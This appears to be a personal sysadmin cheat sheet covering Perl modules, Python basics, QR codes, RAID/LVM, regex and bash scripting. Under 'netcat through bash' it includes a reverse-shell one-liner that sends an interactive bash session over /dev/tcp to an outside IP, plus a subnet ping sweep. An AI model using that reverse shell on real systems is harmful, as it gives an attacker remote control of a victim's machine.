+    Module::Pluggable::Object - automatically give your module the ability to have plugins
+
+    NDBM_File - Tied access to ndbm files
+    Net::Cmd - Network Command class (as used by FTP, SMTP etc)
+    Net::Config - Local configuration data for libnet
+    Net::Domain - Attempt to evaluate the current host's internet name and domain
+    Net::FTP - FTP Client class
+    Net::hostent - by-name interface to Perl's built-in gethost*() functions
+    Net::netent - by-name interface to Perl's built-in getnet*() functions
+    Net::Netrc - OO interface to users netrc file
+    Net::NNTP - NNTP Client class
+    Net::Ping - check a remote host for reachability
+    Net::POP3 - Post Office Protocol 3 Client class (RFC1939)
+    Net::protoent - by-name interface to Perl's built-in getproto*() functions
+    Net::servent - by-name interface to Perl's built-in getserv*() functions
+    Net::SMTP - Simple Mail Transfer Protocol Client
+    Net::Time - time and daytime network client interface
+    NEXT - Provide a pseudo-class NEXT (et al) that allows method redispatch
+
+    O - Generic interface to Perl Compiler backends
+    Object::Accessor - interface to create per object accessors
+    Opcode - Disable named opcodes when compiling perl code
+
+    Package::Constants - List all constants declared in a package
+    Params::Check - A generic input parsing/checking mechanism.
+    Parse::CPAN::Meta - Parse META.yml and META.json CPAN metadata files
+    PerlIO - On demand loader for PerlIO layers and root of PerlIO::* name space
+    PerlIO::encoding - encoding layer
+    PerlIO::scalar - in-memory IO, scalar IO
+    PerlIO::via - Helper class for PerlIO layers implemented in perl
+    PerlIO::via::QuotedPrint - PerlIO layer for quoted-printable strings
+    Pod::Checker - check pod documents for syntax errors
+    Pod::Escapes - for resolving Pod E<...> sequences
+    Pod::Find - find POD documents in directory trees
+    Pod::Functions - Group Perl's functions a la perlfunc.pod
+    Pod::Html - module to convert pod files to HTML
+    Pod::InputObjects - objects representing POD input paragraphs, commands, etc.
+    Pod::LaTeX - Convert Pod data to formatted Latex
+    Pod::Man - Convert POD data to formatted *roff input
+    Pod::ParseLink - Parse an L<> formatting code in POD text
+    Pod::Parser - base class for creating POD filters and translators
+    Pod::ParseUtils - helpers for POD parsing and conversion
+    Pod::Perldoc - Look up Perl documentation in Pod format.
+    Pod::Perldoc::BaseTo - Base for Pod::Perldoc formatters
+    Pod::Perldoc::GetOptsOO - Customized option parser for Pod::Perldoc
+    Pod::Perldoc::ToChecker - let Perldoc check Pod for errors
+    Pod::Perldoc::ToMan - let Perldoc render Pod as man pages
+    Pod::Perldoc::ToNroff - let Perldoc convert Pod to nroff
+    Pod::Perldoc::ToPod - let Perldoc render Pod as ... Pod!
+    Pod::Perldoc::ToRtf - let Perldoc render Pod as RTF
+    Pod::Perldoc::ToText - let Perldoc render Pod as plaintext
+    Pod::Perldoc::ToTk - let Perldoc use Tk::Pod to render Pod
+    Pod::Perldoc::ToXml - let Perldoc render Pod as XML
+    Pod::PlainText - Convert POD data to formatted ASCII text
+    Pod::Select - extract selected sections of POD from input
+    Pod::Simple - framework for parsing Pod
+    Pod::Simple::Checker - check the Pod syntax of a document
+    Pod::Simple::Debug - put Pod::Simple into trace/debug mode
+    Pod::Simple::DumpAsText - dump Pod-parsing events as text
+    Pod::Simple::DumpAsXML - turn Pod into XML
+    Pod::Simple::HTML - convert Pod to HTML
+    Pod::Simple::HTMLBatch - convert several Pod files to several HTML files
+    Pod::Simple::LinkSection - represent "section" attributes of L codes
+    Pod::Simple::Methody - turn Pod::Simple events into method calls
+    Pod::Simple::PullParser - a pull-parser interface to parsing Pod
+    Pod::Simple::PullParserEndToken - end-tokens from Pod::Simple::PullParser
+    Pod::Simple::PullParserStartToken - start-tokens from Pod::Simple::PullParser
+    Pod::Simple::PullParserTextToken - text-tokens from Pod::Simple::PullParser
+    Pod::Simple::PullParserToken - tokens from Pod::Simple::PullParser
+    Pod::Simple::RTF - format Pod as RTF
+    Pod::Simple::Search - find POD documents in directory trees
+    Pod::Simple::SimpleTree - parse Pod into a simple parse tree
+    Pod::Simple::Text - format Pod as plaintext
+    Pod::Simple::TextContent - get the text content of Pod
+    Pod::Simple::XHTML - format Pod as validating XHTML
+    Pod::Simple::XMLOutStream - turn Pod into XML
+    Pod::Text - Convert POD data to formatted ASCII text
+    Pod::Text::Color - Convert POD data to formatted color ASCII text
+    Pod::Text::Overstrike - =for stopwords overstrike
+    Pod::Text::Termcap - Convert POD data to ASCII text with format escapes
+    Pod::Usage - print a usage message from embedded pod documentation
+    POSIX - Perl interface to IEEE Std 1003.1
+
+    Safe - Compile and execute code in restricted compartments
+    Scalar::Util - A selection of general-utility scalar subroutines
+    SDBM_File - Tied access to sdbm files
+    Search::Dict - look - search for key in dictionary file
+    SelectSaver - save and restore selected file handle
+    SelfLoader - load functions only on demand
+    Socket - networking constants and support functions
+    Storable - persistence for Perl data structures
+    Symbol - manipulate Perl symbols and their names
+    Sys::Hostname - Try every conceivable way to get hostname
+    Sys::Syslog - Perl interface to the UNIX syslog(3) calls
+
+    TAP::Base - Base class that provides common functionality to TAP::Parser and TAP::Harness
+    TAP::Formatter::Base - Base class for harness output delegates
+    TAP::Formatter::Color - Run Perl test scripts with color
+    TAP::Formatter::Console - Harness output delegate for default console output
+    TAP::Formatter::Console::ParallelSession - Harness output delegate for parallel console output
+    TAP::Formatter::Console::Session - Harness output delegate for default console output
+    TAP::Formatter::File - Harness output delegate for file output
+    TAP::Formatter::File::Session - Harness output delegate for file output
+    TAP::Formatter::Session - Abstract base class for harness output delegate
+    TAP::Harness - Run test scripts with statistics
+    TAP::Object - Base class that provides common functionality to all TAP::* modules
+    TAP::Parser - Parse TAP|Test::Harness::TAP output
+    TAP::Parser::Aggregator - Aggregate TAP::Parser results
+    TAP::Parser::Grammar - A grammar for the Test Anything Protocol.
+    TAP::Parser::Iterator - Base class for TAP source iterators
+    TAP::Parser::Iterator::Array - Iterator for array-based TAP sources
+    TAP::Parser::Iterator::Process - Iterator for process-based TAP sources
+    TAP::Parser::Iterator::Stream - Iterator for filehandle-based TAP sources
+    TAP::Parser::IteratorFactory - Figures out which SourceHandler objects to use for a given Source
+    TAP::Parser::Multiplexer - Multiplex multiple TAP::Parsers
+    TAP::Parser::Result - Base class for TAP::Parser output objects
+    TAP::Parser::Result::Bailout - Bailout result token.
+    TAP::Parser::Result::Comment - Comment result token.
+    TAP::Parser::Result::Plan - Plan result token.
+    TAP::Parser::Result::Pragma - TAP pragma token.
+    TAP::Parser::Result::Test - Test result token.
+    TAP::Parser::Result::Unknown - Unknown result token.
+    TAP::Parser::Result::Version - TAP syntax version token.
+    TAP::Parser::Result::YAML - YAML result token.
+    TAP::Parser::ResultFactory - Factory for creating TAP::Parser output objects
+    TAP::Parser::Scheduler - Schedule tests during parallel testing
+    TAP::Parser::Scheduler::Job - A single testing job.
+    TAP::Parser::Scheduler::Spinner - A no-op job.
+    TAP::Parser::Source - a TAP source & meta data about it
+    TAP::Parser::Utils - Internal TAP::Parser utilities
+    TAP::Parser::YAMLish::Reader - Read YAMLish data from iterator
+    TAP::Parser::YAMLish::Writer - Write YAMLish data
+    Term::ANSIColor - Color screen output using ANSI escape sequences
+    Term::Cap - Perl termcap interface
+    Term::Complete - Perl word completion module
+    Term::ReadLine - Perl interface to various readline packages. If no real package is found, substitutes stubs instead of basic functions.
+    Term::UI - Term::ReadLine UI made easy
+    Term::UI::History - history function
+    Test - provides a simple framework for writing test scripts
+    Test::Builder - Backend for building test libraries
+    Test::Builder::Module - Base class for test modules
+    Test::Builder::Tester - test testsuites that have been built with Test::Builder
+    Test::Builder::Tester::Color - turn on colour in Test::Builder::Tester
+    Test::Harness - Run Perl standard test scripts with statistics
+    Test::More - yet another framework for writing test scripts
+    Test::Simple - Basic utilities for writing tests.
+    Text::Abbrev - abbrev - create an abbreviation table from a list
+    Text::Balanced - Extract delimited text sequences from strings.
+    Text::ParseWords - parse text into an array of tokens or array of arrays
+    Text::Soundex - Implementation of the soundex algorithm.
+    Text::Tabs - expand and unexpand tabs like unix expand(1) and unexpand(1)
+    Text::Wrap - line wrapping to form simple paragraphs
+    Thread - Manipulate threads in Perl (for old code only)
+    Thread::Queue - Thread-safe queues
+    Thread::Semaphore - Thread-safe semaphores
+    Tie::Array - base class for tied arrays
+    Tie::File - Access the lines of a disk file via a Perl array
+    Tie::Handle - base class definitions for tied handles
+    Tie::Hash - base class definitions for tied hashes
+    Tie::Hash::NamedCapture - Named regexp capture buffers
+    Tie::Memoize - add data to hash when needed
+    Tie::RefHash - use references as hash keys
+    Tie::Scalar - base class definitions for tied scalars
+    Tie::StdHandle - base class definitions for tied handles
+    Tie::SubstrHash - Fixed-table-size, fixed-key-length hashing
+    Time::gmtime - by-name interface to Perl's built-in gmtime() function
+    Time::HiRes - High resolution alarm, sleep, gettimeofday, interval timers
+    Time::Local - efficiently compute time from local and GMT time
+    Time::localtime - by-name interface to Perl's built-in localtime() function
+    Time::Piece - Object Oriented time objects
+    Time::Seconds - a simple API to convert seconds to other date values
+    Time::tm - internal object used by Time::gmtime and Time::localtime
+
+    Unicode::Collate - Unicode Collation Algorithm
+    Unicode::Normalize - Unicode Normalization Forms
+    Unicode::UCD - Unicode character database
+    UNIVERSAL - base class for ALL classes (blessed references)
+    User::grent - by-name interface to Perl's built-in getgr*() functions
+    User::pwent - by-name interface to Perl's built-in getpw*() functions
+
+    XSLoader - Dynamically load C libraries into Perl code
+
+* PYTHON
+** COMMAND : datetime
+
+
+
+** 101
+*** How to view module functions
+
+    import module
+    print dir(module) # Find functions of interest.
+
+    # For each function of interest:
+    help(module.interesting_function)
+    print module.interesting_function.func_defaults
+
+*** How to install a module
+    Install get-pip.py (https://bootstrap.pypa.io/get-pip.py)
+
+eric@skylab~: sudo -H python3 get-pip.py
+Collecting pip
+  Downloading pip-6.1.1-py2.py3-none-any.whl (1.1MB)
+    100% |████████████████████████████████| 1.1MB 472kB/s
+Collecting setuptools
+  Downloading setuptools-15.0-py2.py3-none-any.whl (501kB)
+    100% |████████████████████████████████| 503kB 772kB/s
+Installing collected packages: pip, setuptools
+Successfully installed pip-6.1.1 setuptools-15.0
+
+*** How to update pip
+    pip install -U pip
+
+
+*** BOOLEAN
+
+     Boolean Operators
+------------------------
+True and True is True
+True and False is False
+False and True is False
+False and False is False
+
+True or True is True
+True or False is True
+False or True is True
+False or False is False
+
+Not True is False
+Not False is True
+
+*** Class vs Type // Instance vs Object
+    Class is a user-defined type
+    Type is a built-in type
+
+    Instance and Object are synonymous
+    Objects are instances of types, 52 is an instance of the type int
+    52 is an int object
+
+** array : string
+   string_1 = "Camelot"
+   string_2 = "place"
+
+   print "Let's not go to %s. 'Tis a silly %s." % (string_1, string_2)
+
+** function
+def clinic():
+    print "You've just entered the clinic!"
+    print "Do you take the door on the left or the right?"
+    answer = raw_input("Type left or right and hit 'Enter'.").lower()
+    if answer == "left" or answer == "l":
+        print "This is the Verbal Abuse Room, you heap of parrot droppings!"
+    elif answer == "right" or answer == "r":
+        print "Of course this is the Argument Room, I've told you that already!"
+    else:
+        print "You didn't pick left or right! Try again."
+        clinic()
+
+clinic()
+
+** if
+    if answer == "left" or answer == "l":
+        print "This is the Verbal Abuse Room, you heap of parrot droppings!"
+    elif answer == "right" or answer == "r":
+        print "Of course this is the Argument Room, I've told you that already!"
+    else:
+        print "You didn't pick left or right! Try again."
+
+** len(var)
+   # length
+
+** print
+
+** raw_input()
+   name = raw_input("What is your name?")
+
+** str(int)
+   # Convert to string
+
+** var.isalpha()
+
+** var.lower()
+   # Convert to lowercase
+   # var.lower()
+
+** var.upper()
+   # Convert to uppercase
+   # var.upper()
+
+** variable = "string"
+   # needs to be in quotations
+   # or it will think string is a variable
+
+** variable = digit
+   # does not need to be in quotations
+
+* PYTHON3
+  !! Don't Name Your Script With The Name Of A Module !!
+
+  !! You will get an error:                           !!
+  !! AttributeError: 'module' object has no attribute !!
+  !! 'b64decode'
+
+** base64
+   # It wants a string of 8-bit bytes
+   # http://stackoverflow.com/questions/8908287/base64-encoding-in-python-3
+   encoded = base64.b64encode(b'string to encode')
+   encoded = b'string to encode'
+
+* proc
+  /proc/fb	video framebuffer
+
+* QR
+  # QR Code Data Max Capacity
+  Numeric only: 7,089 characters
+  Alphanumeric: 4,296 characters
+  Binary (8 bits): 2,953 bytes
+
+** qrencode
+   # qrencode [OPTION]... [STRING]
+   qrencode -s 10 -o aurora_QR.png www.danielides.de/com/aurora.html
+
+Usage: qrencode [OPTION]... [STRING]
+Encode input data in a QR Code and save as a PNG or EPS image.
+
+  -h           display this message.
+  --help       display the usage of long options.
+  -o FILENAME  write image to FILENAME. If '-' is specified, the result
+               will be output to standard output. If -S is given, structured
+               symbols are written to FILENAME-01.png, FILENAME-02.png, ...
+               (suffix is removed from FILENAME, if specified)
+  -s NUMBER    specify module size in dots (pixels). (default=3)
+  -l {LMQH}    specify error correction level from L (lowest) to H (highest).
+               (default=L)
+  -v NUMBER    specify the version of the symbol. (default=auto)
+  -m NUMBER    specify the width of the margins. (default=4 (2 for Micro))
+  -d NUMBER    specify the DPI of the generated PNG. (default=72)
+  -t {PNG,EPS,SVG,ANSI,ANSI256,ASCII,ASCIIi,UTF8,ANSIUTF8}
+               specify the type of the generated image. (default=PNG)
+  -S           make structured symbols. Version must be specified.
+  -k           assume that the input text contains kanji (shift-jis).
+  -c           encode lower-case alphabet characters in 8-bit mode. (default)
+  -i           ignore case distinctions and use only upper-case characters.
+  -8           encode entire data in 8-bit mode. -k, -c and -i will be ignored.
+  -M           encode in a Micro QR Code.
+  --foreground=RRGGBB[AA]
+  --background=RRGGBB[AA]
+               specify foreground/background color in hexadecimal notation.
+               6-digit (RGB) or 8-digit (RGBA) form are supported.
+               Color output support available only in PNG and SVG.
+  -V           display the version number and copyrights of the qrencode.
+  [STRING]     input data. If it is not specified, data will be taken from
+               standard input.
+
+** qrqt
+   # Linux client that can view and edit QR codes locally
+
+* RAID
+** RAID : dmraid
+   # discover software RAID devices and activate RAID sets
+
+** RAID : dmsetup
+   # dmsetup manages logical devices that use the device-mapper driver. Devices are  created  by  loading  a table that specifies a target for each sector (512 bytes) in the logical device.
+   # The first argument to dmsetup is a command. The  second  argument  is  the  logical device name or uuid.
+   # Invoking the command as devmap_name is equivalent to dmsetup info -c --noheadings -j major -m minor.
+
+** RAID : lvm
+
+   lvm pvscan
+   lvm vgscan
+
+*** pvresize
+    # Growing the physical volume is trivial
+    pvresize /dev/md0
+
+*** vgcfgbackup
+    /etc/lvm/backup
+    /etc/lvm/archives
+
+*** vgcfgrestore
+     lvm vgcfgrestore VolGroup
+
+*** vgchange
+    # Activate VG
+    # main purpose is to activate and deactivate VolumeGroupName, or all volume groups if none is specified.
+    vgchange --activate y VolGroup
+
+*** vgextend
+    # Extend VG to device
+    vgextend VolGroup01 /dev/sde1 		# Volume group "VolGroup01" successfully extended
+
+    use xfs_growfs afterwards
+
+*** vgrename
+    # Rename VG
+    # stop VG first
+    vgchange --activate n VolGroup
+    vgrename VolGroup_old VolGroup_new
+
+** RAID : Step 1 : mdadm
+   Linux software RAID manager
+
+   # Create RAID with partitions with 'fd' type ID
+
+
+   mdadm --stop /dev/md0		# mdadm: stopped /dev/md0
+   cat /proc/mdstat		# Personalities : [linear] [raid0] [raid1] [raid10] [raid6] [raid5] [raid4]
+                                 # unused devices: <none>
+
+   mdadm --misc --examine /dev/sda										# view device
+
+   mdadm --create /dev/md0 --level=6 --raid-devices=5 /dev/sda /dev/sdb /dev/sdc /dev/sdd /dev/sde		# creating raid
+   mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sda1 missing
+   sudo mdadm --assemble /dev/md/mdX --name=new_name --update=name /dev/sd[fg]1					# update md to new name
+   mdadm --manage --remove /dev/md0 /dev/sdc1									# remote a disk from raid
+   mdadm --manage --add /dev/md0 /dev/sdc1									# add disks to raid
+   mdadm --grow --raid-devices=N+1 /dev/md0									# grow raid, by previous N disks
+   mdadm --assemble --scan											# assemble and start raid
+   mdadm --misc --detail --scan >> /etc/mdadm/mdadm.conf								# auto-assemble raid on boot
+
+   in /etc/fstab:
+   /dev/mapper/lvm--raid-raid6	/	ext4	errors=remount-ro	0	1				# auto mount LV on boot
+
+   # echo action > /sys/block/mdX/md/sync_action
+   "idle"   - Halt the current sync action.
+   "frozen" - Freeze the current sync action.
+   "resync" - Initiate/continue a resync.
+   "recover"- Initiate/continue a recover process.
+   "check"  - Initiate a check (i.e. a "scrub") of the array.
+   "repair" - Initiate a repair of the array.
+   "reshape"- Currently unsupported (-EINVAL).
+
+** RAID : Step 2 : lvm pvcreate
+   pvcreate /dev/md0
+
+** RAID : Step 3 : lvm vgcreate
+   vgcreate lvm-raid /dev/md0
+
+** RAID : Step 4 : lvm lvcreate
+   lvcreate -l 100%VG lvm-raid -n home
+
+* RASBPI
+** Video Modes
+http://elinux.org/RPiconfig#Video
+
+* REGEX
+  id | grep uid | awk '{print $1}' | sed 's/.*\([(].*[)]\)/\1/;s/(//;s/)//'	# Current user
+  md5sum.exe * 2>/dev/null | sed -E 's/^([a-z0-9]*)[[:space:]]\*(.*)\.(.*)/mv -v "\2.\3" \1.\3/' | /bin/sh	# rename file to md5 hash
+  for i in "saying words" ; do cd "${i}"; printf "\e[31m$(pwd)\e[0m\n"; md5sum.exe * 2>/dev/null | sed -E 's/^([a-z0-9]*)[[:space:]]\*(.*)\.(.*)/mv -v "\2.\3" \1.\3/' | /bin/sh; cd -; done	# rename file to md5 hash
+
+  IP Address........[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}
+                    [0-9]\{1,3\}[.][0-9]\{1,3\}[.][0-9]\{1,3\}[.][0-9]\{1,3\}
+
+  Class A,B,C.......()[.]()[.]()[.]()
+
+  Email Address.....[0-9a-zA-Z]*[@][a-zA-Z]{2,3}
+                    [0-9a-zA-Z]*[ ][aA][tT][ ][a-zA-Z]{2,3}
+  MAC Address.......([0-9A-F]{2}[:-]){5}([0-9A-F]{2})
+
+** Lookahead
+   # matches letter and number that follows with a space (without including the space)
+   md5sum.exe '/path/to/file' | grep -Pi --color '^[a-z0-9]*(?=[ ])'
+
+   (?=(regex))
+   (?!(regex))
+
+** Lookbehind
+   (?<=(regex))
+   (?<!(regex))
+
+** Character classes
+
+The character class is the most basic regular expression concept after a literal match. It makes one small sequence of characters match a larger set of characters. For example, [A-Z] could stand for the alphabet, and \d could mean any digit. Character classes apply to both POSIX levels.
+
+When specifying a range of characters, such as [a-Z] computer's locale settings determine the contents by the numeric ordering of the character encoding. They could store digits in that sequence, or the ordering could be abc...zABC...Z, or aAbBcC...zZ. So the POSIX standard defines a character class, which will be known by the regular expression processor installed. Those definitions are in the following table:
+
+| POSIX      | Non-standard | Perl/Tcl | Vim   | ASCII                              | Description                                |
+|------------+--------------+----------+-------+------------------------------------+--------------------------------------------|
+| [:alnum:]  |              |          |       | [A-Za-z0-9]                        | Alphanumeric characters                    |
+|            | [:word:]     | \w       | \w    | [A-Za-z0-9_]                       | Alphanumeric characters plus "_"           |
+|            |              | \W       | \W    | [^A-Za-z0-9_]                      | Non-word characters                        |
+| [:alpha:]  |              |          | \a    | [A-Za-z]                           | Alphabetic characters                      |
+| [:blank:]  |              |          | \s    | [ \t]                              | Space and tab                              |
+|            |              | \b       | \< \> | (?<=\W)(?=\w)|(?<=\w)(?=\W)        | Word boundaries                            |
+| [:cntrl:]  |              |          |       | [\x00-\x1F\x7F]                    | Control characters                         |
+| [:digit:]  |              | \d       | \d    | [0-9]                              | Digits                                     |
+|            |              | \D       | \D    | [^0-9]                             | Non-digits                                 |
+| [:graph:]  |              |          |       | [\x21-\x7E]                        | Visible characters                         |
+| [:lower:]  |              |          | \l    | [a-z]                              | Lowercase letters                          |
+| [:print:]  |              |          | \p    | [\x20-\x7E]                        | Visible characters and the space character |
+| [:punct:]  |              |          |       | [][!"#$%&'()*+,./:;<=>?@\^_`{|}~-] | Punctuation characters                     |
+| [:space:]  |              | \s       | \_s   | [ \t\r\n\v\f]                      | Whitespace characters                      |
+|            |              | \S       |       | [^ \t\r\n\v\f]                     | Non-whitespace characters                  |
+| [:upper:]  |              |          | \u    | [A-Z]                              | Uppercase letters                          |
+| [:xdigit:] |              |          | \x    | [A-Fa-f0-9]                        | Hexadecimal digits                         |
+
+* Shell Scripting
+** array
+   ArrayName=("element 1" "element 2" "element 3")
+
+   array=(red green blue yellow magenta)
+   len=${#array[*]}
+   echo "The array has $len members. They are:"
+   i=0
+   while [ $i -lt $len ]; do
+   echo "$i: ${array[$i]}"
+   let i++
+   done
+
+** array unset
+   unset Array[0]	Delete item in array
+   unset Array 		Deleted an entire array
+
+** break
+   The break statement is used to terminate the execution of the entire loop, after completing the execution of all of the lines of code up to the break statement. It then steps down to the code following the end of the loop.
+
+** case
+# Take parameters and give them something to do
+# Multiple arguments/parameters/options
+while [[ "$1" != "" ]]; do # Read parameters
+
+    case $1 in
+	--reverse)reverse=1;;
+	-b)b="-rtlDhu --delete --delete-excluded ";;
+	-go)noconfirm=1;;
+	-i)i="-i -progress --stats ";;
+    esac
+
+    shift
+done
+
+
+#!/bin/bash
+OPT=$1   # option
+FILE=$2  # filename
+
+# test -e and -E command line args matching
+case $OPT in
+-e|-E)
+  	echo "Editing $2 file..."
+        # make sure filename is passed else an error displayed
+  	[ -z $FILE ] && { echo "File name missing"; exit 1; } || vi $FILE
+  	;;
+  -c|-C)
+  	echo "Displaying $2 file..."
+  	[ -z $FILE ] && { echo "File name missing"; exit 1; } || cat $FILE
+  	;;
+  -d|-D)
+  	echo "Today is $(date)"
+  	;;
+   *)
+    echo "Bad argument!"
+    echo "Usage: $0 -ecd filename"
+    echo "	-e file : Edit file."
+    echo "	-c file : Display file."
+    echo "	-d      : Display current date and time."
+    ;;
+esac
+
+** cat
+function usage() {
+    cat <<EOF
+  usage: $0 options
+
+  This script will install opencenter packages.
+
+  OPTIONS:
+  -h  Show this message
+  -v  Verbose output
+  EOF
+}
+
+** cd
+   cd $(dirname $0)	# CD to DIR of running script
+
+** chvt
+   # Change foreground virtual terminal
+
+   chvt N
+
+   The command chvt N makes /dev/ttyN the foreground terminal. (The corresponding screen is created if it did not exist yet. To get rid of unused VTs, use deallocvt(1).) The key combination (Ctrl-)LeftAlt-FN (with N in the range 1-12) usually has a similar effect.
+
+** continue
+   The continue statement is similar to the break command, except that it causes the current iteration of the loop to exit, rather than the entire loop.
+
+   This statement is useful when an error has occurred but you want to try to execute the next iteration of the loop.
+
+** date
+   date +%F-%H.%M.%S%p
+   2013-02-18-03.18.31AM
+
+** echo
+   -n	do not output the trailing newline
+
+** eval
+   eval echo \${$n} runs the parameters passed to eval. After expansion, the parameters are echo and ${1}. So eval echo \${$n} runs the command echo ${1}.
+
+** for
+
+   # three-expressions
+   (exp1) initializer
+   (exp2) loop-test or condition
+   (exp3) counting expression
+
+   #!/bin/bash
+   for (( c=1; c<=5; c++ ))
+   do
+       echo "Welcome $c times"
+   done
+
+   for i in list; do
+   command
+   done
+
+   # number range
+   for i in {1..6}
+   for i in {0..10..2}		# {START..END..INCREMENT}
+
+   # Example xargs ping
+   for i in {1..255}; do echo ${i} | xargs -P0 -i /bin/ping -c 1 10.25.53.{} >/dev/null && printf "[ \e[0;32m10.25.53.${i}\e[0m ] " || printf "[ \e[0;31m10.25.53.${i}\e[0m ]"; done
+
+   # Example (scanning drive):
+	 for _drive in `ls /cygdrive`; do
+	 _home=/cygdrive/$_drive/home/
+	 _backup=/cygdrive/$_drive/backups
+	 # set backup location
+	     if [ -d $_backup ]; then
+	         if [ -d $_home ]; then
+
+	             rsync -abyhuiP --modify-window=2 --delete-delay -c --stats --backup-dir=$_backup/$(date +%F) ../eric ../family ../cjguidance $_home
+	         fi
+	     else
+	         echo $_drive\:\\ is not the backup drive.
+	     fi
+	 done
+
+
+	 for _d in `ls /cygdrive`; do
+  	    if [ -d /cygdrive/$_d/$_w ]; then
+	       destination=/cygdrive/$_d/$_w
+	    fi
+	 done
+
+     # Example (array):
+     for (( i=0; i<${#ifcfgA[@]}; i++ )); do
+
+** getopts
+while getopts "hvV" option
+do
+    case $option in
+	h)
+	    usage
+	    exit 1
+	    ;;
+	v) VERBOSE=1 ;;
+	V)
+	    display_version
+	    exit 1
+	    ;;
+	?)
+	    usage
+	    exit 1
+	    ;;
+    esac
+done
+
+** if
+# IF menu
+function main {
+	echo -e "RSA NetWitness Tech Support Script\nVersion: $scriptver\n"
+	if [ $# -eq 1 ]; then
+		if [[ $1 != "-p" && $1 != "-d" && $1 != "-i" && $1 != "-detect" && $1 != "-u" ]]; then
+			usage
+		fi
+	elif [[ $# -ge 1 && $# -le 6 ]] ; then
+		echo -n
+	else
+		usage
+	fi
+
+# another one
+for arg in "$@"; do
+
+	case $arg in
+	    --reverse)
+		reverse=1
+		;;
+	    -b)
+		b="-rtlDhu --delete --delete-excluded --no-p --no-g "
+		;;
+	    -go)
+		noconfirm=1
+		;;
+	    -i)
+		i="-i --progress --stats "
+		;;
+	    *|-h)
+		usage
+		;;
+	esac
+
+done
+
+if [[ -z "$1" ]]; then usage; fi
+
+
+# Verifying arguments
+if [[ $arg == "-p" || $arg == "-d" || $arg == "-i" || $arg == "-e" || $arg == "-ea" || $arg == "-u" ]]; then
+
+
+| Primary expressions         | Primary Meaning                                                                                                                                                                                                                                                     |
+|-----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| [ -a FILE ]                 | True if FILE exists.                                                                                                                                                                                                                                                |
+| [ -B File ]                 | True if FILE exists and is a block-special file.                                                                                                                                                                                                                    |
+| [ -c FILE ]                 | True if FILE exists and is a character-special file.                                                                                                                                                                                                                |
+| [ -d FILE ]                 | True if FILE exists and is a directory.                                                                                                                                                                                                                             |
+| [ -e FILE ]                 | True if FILE exists.                                                                                                                                                                                                                                                |
+| [ -f FILE ]                 | True if FILE exists and is a regular file.                                                                                                                                                                                                                          |
+| [ -g FILE ]                 | True if FILE exists and its SGID bit is set.                                                                                                                                                                                                                        |
+| [ -h FILE ]                 | True if FILE exists and is a symbolic link.                                                                                                                                                                                                                         |
+| [ -k FILE ]                 | True if FILE exists and its sticky bit is set.                                                                                                                                                                                                                      |
+| [ -p FILE ]                 | True if FILE exists and is a named pipe (FIFO).                                                                                                                                                                                                                     |
+| [ -r FILE ]                 | True if FILE exists and is readable.                                                                                                                                                                                                                                |
+| [ -s FILE ]                 | True if FILE exists and has a size greater than zero.                                                                                                                                                                                                               |
+| [ -t FD ]                   | True if file descriptor FD is open and refers to a terminal.                                                                                                                                                                                                        |
+| [ -u FILE ]                 | True if FILE exists and its SUID (set user ID) bit is set.                                                                                                                                                                                                          |
+| [ -w FILE ]                 | True if FILE exists and is writable.                                                                                                                                                                                                                                |
+| [ -x FILE ]                 | True if FILE exists and is executable.                                                                                                                                                                                                                              |
+| [ -O FILE ]                 | True if FILE exists and is owned by the effective user ID.                                                                                                                                                                                                          |
+| [ -G FILE ]                 | True if FILE exists and is owned by the effective group ID.                                                                                                                                                                                                         |
+| [ -L FILE ]                 | True if FILE exists and is a symbolic link.                                                                                                                                                                                                                         |
+| [ -N FILE ]                 | True if FILE exists and has been modified since it was last read.                                                                                                                                                                                                   |
+| [ -S FILE ]                 | True if FILE exists and is a socket.                                                                                                                                                                                                                                |
+| [ FILE1 -nt FILE2 ]         | True if FILE1 has been changed more recently than FILE2, or if FILE1 exists and FILE2 does not.                                                                                                                                                                     |
+| [ FILE1 -ot FILE2 ]         | True if FILE1 is older than FILE2, or is FILE2 exists and FILE1 does not.                                                                                                                                                                                           |
+| [ FILE1 -ef FILE2 ]         | True if FILE1 and FILE2 refer to the same device and inode numbers.                                                                                                                                                                                                 |
+| [ -o OPTIONNAME ]           | True if shell option "OPTIONNAME" is enabled.                                                                                                                                                                                                                       |
+| [ -z STRING ]               | True of the length if "STRING" is zero.                                                                                                                                                                                                                             |
+| [ -n STRING ] or [ STRING ] | True if the length of "STRING" is non-zero.                                                                                                                                                                                                                         |
+| [ STRING1 == STRING2 ]      | True if the strings are equal. "=" may be used instead of "==" for strict POSIX compliance.                                                                                                                                                                         |
+| [ STRING1 != STRING2 ]      | True if the strings are not equal.                                                                                                                                                                                                                                  |
+| [ STRING1 < STRING2 ]       | True if "STRING1" sorts before "STRING2" lexicographically in the current locale.                                                                                                                                                                                   |
+| [ STRING1 > STRING2 ]       | True if "STRING1" sorts after "STRING2" lexicographically in the current locale.                                                                                                                                                                                    |
+| [ ARG1 OP ARG2 ]            | "OP" is one of -eq, -ne, -lt, -le, -gt or -ge. These arithmetic binary operators return true if "ARG1" is equal to, not equal to, less than, less than or equal to, greater than, or greater than or equal to "ARG2", respectively. "ARG1" and "ARG2" are integers. |
+** let
+   let C1=$A+$B		Performs arithmetic operations
+
+** logger
+   if [ ! -d "$backups/${backupsA[$i]}" ]; then mkdir "$backups/${backupsA[$i]}"  2>$stderr && \	# make folders
+   (logger -i "$0 - SUCCESS - !!") || (logger -i "$0 - ERROR - !!"; logger -i <$stderr)	        # logger
+
+** mount
+   # mount.cifs version 4.x+
+   use -o sec=ntlm
+
+   nosuid			# don't allow user to run as uid that mounted it (root)
+   noatime			# no access time, better performance
+
+** netcat through bash
+   Netcat without Netcat with Mad Props to Rami Method 1:
+
+   Hacker: nc -l -n -vv -p 8080 Victim: /bin/bash -i > /dev/tcp/173.214.173.151/8080 0<&1 2>&1
+
+** printf
+   printf '%s\n' "$var"		# Will output the content of $var followed by a newline character regardless of what character it may contain.
+   printf %s "$var"		# Will output it without the trailing newline character.
+
+   printf '<string> %16d <string>\n' "$var"		# Will print <string> followed by 16 digits (from $var output) followed by <string>
+   printf ' '$(md5sum Packages.gz | cut --delimiter=' ' --fields=1)' %16d Packages.gz\n' $(wc --bytes Packages | cut --delimiter=' ' --fields=1)
+
+** read
+   read -s secretpassword	# characters won't be shown
+
+# read line in file and process each segment as a parameter
+while read file key log lat
+do
